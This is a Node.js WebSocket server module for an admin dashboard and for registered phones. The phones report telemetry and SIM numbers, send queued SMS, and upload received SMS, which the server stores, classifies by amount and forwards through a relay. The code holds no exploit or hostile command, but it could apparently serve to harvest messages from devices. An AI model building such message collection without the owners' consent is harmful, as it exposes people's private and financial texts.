"use strict";

const crypto = require("crypto");
const { ObjectId } = require("mongodb");
const config = require("../config");
const db = require("../database");
const u = require("../utils");
const hub = require("../hub");
const auth = require("../auth");
const relay = require("../relay");
const { ackOutbox } = require("./devices");

// ---- cookie-session ko ws ke liye manually parse karo ----
function parseCookies(req) {
  const out = {};
  for (const part of String(req.headers.cookie || "").split(";")) {
    const i = part.indexOf("=");
    if (i < 0) continue;
    out[part.slice(0, i).trim()] = decodeURIComponent(part.slice(i + 1).trim());
  }
  return out;
}

function sessionFromReq(req) {
  const cookies = parseCookies(req);
  const name = config.COOKIE_NAME;
  const val = cookies[name];
  const sig = cookies[name + ".sig"];
  if (!val || !sig) return {};
  const expected = crypto.createHmac("sha256", config.SESSION_SECRET)
    .update(`${name}.${val}`).digest("base64");
  if (expected.replace(/=+$/, "") !== sig.replace(/=+$/, "")) return {};
  try { return JSON.parse(Buffer.from(val, "base64").toString("utf8")) || {}; }
  catch (_) { return {}; }
}

// ------------------------------------------------------------- admin socket

async function adminSocket(ws, req) {
  const url = new URL(req.url, "http://x");
  const token = url.searchParams.get("token");

  let ident = sessionFromReq(req).adminId || null;
  if (!ident) {
    ident = token ? auth.verifyToken(token) : null;
    if (!ident) { ws.close(1008); return; }
  }

  const [role, name] = auth.splitIdent(ident);
  if (role === "key" && !u.keyActive(await u.keyDoc(name))) { ws.close(1008); return; }

  await hub.adminHub.add(ws);

  let total = 0;
  try { total = await db.devices.countDocuments({}); } catch (_) {}

  ws.send(JSON.stringify({
    type: "hello",
    online: hub.hub.onlineCount,
    devices: total,
    server_time: db.utcNow().toISOString(),
  }));

  ws.on("message", (raw) => {
    try {
      const msg = JSON.parse(raw.toString());
      if (String(msg.type || "").toLowerCase() === "ping") {
        ws.send(JSON.stringify({ type: "pong", ts: Math.floor(Date.now() / 1000) }));
      }
    } catch (_) {}
  });

  ws.on("close", () => hub.adminHub.remove(ws));
  ws.on("error", () => hub.adminHub.remove(ws));
}

// ------------------------------------------------------------ device socket

function startKeepalive(ws, deviceId) {
  return setInterval(() => {
    try { ws.send(JSON.stringify({ type: "ping", ts: Math.floor(Date.now() / 1000) })); }
    catch (_) { return; }
    const last = hub.hub.lastPong.get(deviceId) || Date.now() / 1000;
    if (Date.now() / 1000 - last > config.WS_IDLE_TIMEOUT) { try { ws.close(1001); } catch (_) {} }
  }, config.WS_PING_INTERVAL * 1000);
}

async function deviceSocket(ws, req, registrationId) {
  const rh = u.hashValue(String(registrationId).trim());

  let device;
  try { device = await db.devices.findOne({ registration_id_hash: rh }); }
  catch (_) { ws.close(1011); return; }
  if (!device) { ws.close(1008); return; }

  const deviceId = String(device._id);
  await hub.hub.addDevice(deviceId, ws);

  const keepalive = startKeepalive(ws, deviceId);
  let lastSeenPush = 0;

  try {
    await db.devices.updateOne({ _id: device._id }, {
      $set: {
        ws_connected: true, ws_connected_at: db.utcNow(), last_seen: db.utcNow(),
        is_active: true, install_state: "active",
      },
    }).catch(() => {});

    u.logEvent("device_socket_open", { device_id: deviceId });
    hub.broadcastDevice(deviceId, { ws_connected: true, status: "Online", last_seen: db.utcNow().toISOString() });

    let pendingCount = 0;
    try { pendingCount = await db.outbox.countDocuments({ device_id: deviceId, status: "pending" }); } catch (_) {}

    ws.send(JSON.stringify({ type: "hello", server_time: db.utcNow().toISOString(), pending: pendingCount }));
    await hub.pushOutbox(deviceId);

    ws.on("message", async (raw) => {
      if (raw.length > config.MAX_WS_TEXT_BYTES) return;

      let msg;
      try { msg = JSON.parse(raw.toString()); } catch (_) { return; }

      const mtype = String(msg.type || "").toLowerCase();
      hub.hub.lastPong.set(deviceId, Date.now() / 1000);

      const now = Date.now() / 1000;
      if (now - lastSeenPush > 5) {
        lastSeenPush = now;
        db.devices.updateOne({ _id: device._id }, { $set: { last_seen: db.utcNow() } }).catch(() => {});
      }

      if (mtype === "ping" || mtype === "heartbeat") {
        ws.send(JSON.stringify({ type: "pong", ts: Math.floor(Date.now() / 1000) }));
        return;
      }
      if (mtype === "pong") return;

      if (mtype === "telemetry") {
        const data = (msg.data && typeof msg.data === "object") ? msg.data : msg.telemetry;
        if (data && typeof data === "object") {
          await u.applyTelemetry(device, data).catch(() => {});
          hub.broadcastDevice(deviceId, { ws_connected: true, telemetry: data, last_seen: db.utcNow().toISOString() });
        }
      } else if (mtype === "command_result") {
        const data = (msg.data && typeof msg.data === "object") ? msg.data : {};
        const action = String(msg.action || "").toLowerCase();
        if (["fetch_number", "number", "sim_info", "telemetry", "refresh_telemetry"].includes(action)) {
          await u.applyTelemetry(device, data).catch(() => {});
          if (data.sim_number) {
            db.devices.updateOne({ _id: device._id }, { $set: { number_requested_at: null } }).catch(() => {});
          }
          hub.broadcastDevice(deviceId, { ws_connected: true, telemetry: data });
        }
      } else if (mtype === "ack") {
        const itemId = msg.id;
        if (itemId) {
          let slot = parseInt(msg.sim_slot, 10);
          if (!Number.isFinite(slot)) slot = -1;
          try { await ackOutbox(String(itemId), String(msg.status || "sent"), String(msg.error || ""), slot); }
          catch (_) {}
        }
      } else if (mtype === "inbox") {
        for (const item of (msg.items || []).slice(0, 50)) {
          if (!item || typeof item !== "object") continue;
          const body = String(item.body || "").slice(0, config.MAX_SMS_BODY);
          const address = String(item.address || "").slice(0, 64);
          if (!body) continue;
          const { kind, amount, flow } = u.classifySms(address, body);
          const mid = await u.insertMessage({
            device_id: deviceId,
            device_name: device.device_name || "Unknown",
            direction: String(item.direction || "in").slice(0, 8),
            address, body, kind, amount, flow,
            status: "received", created_at: db.utcNow(),
          });
          if (mid) {
            hub.broadcastMessage(await db.messages.findOne({ _id: mid }).catch(() => null));
            if (String(item.direction || "in") === "in") hub.spawn(relay.relayForwardIncoming(device, address, body));
          }
        }
      }
    });

    ws.on("close", () => {
      clearInterval(keepalive);
      hub.hub.removeDevice(deviceId, ws);
      db.devices.updateOne({ _id: device._id }, { $set: { ws_connected: false } }).catch(() => {});
      hub.broadcastDevice(deviceId, { ws_connected: false, status: "Offline" });
      u.logEvent("device_socket_close", { device_id: deviceId });
    });
  } catch (_) {
    clearInterval(keepalive);
    await hub.hub.removeDevice(deviceId, ws);
  }
}

module.exports = { adminSocket, deviceSocket };